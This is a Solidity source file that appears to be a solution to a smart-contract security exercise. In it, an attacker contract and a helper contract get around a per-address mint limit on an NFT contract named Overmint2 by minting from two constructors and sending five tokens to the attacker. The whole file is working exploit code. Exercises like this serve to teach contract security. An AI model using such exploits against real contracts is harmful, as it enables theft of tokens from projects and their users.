// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "./Overmint2.sol";

contract Overmint2Attacker {
    constructor(Overmint2 victim) {
        victim.mint();
        victim.mint();
        victim.mint();

        victim.safeTransferFrom(address(this), msg.sender, 1);
        victim.safeTransferFrom(address(this), msg.sender, 2);
        victim.safeTransferFrom(address(this), msg.sender, 3);

        new Overmint2AttackerHelper(victim, msg.sender);
    }
}

contract Overmint2AttackerHelper {
    constructor(Overmint2 victim, address attacker) {
        victim.mint();
        victim.mint();

        victim.transferFrom(address(this), attacker, 4);
        victim.transferFrom(address(this), attacker, 5);
    }
}
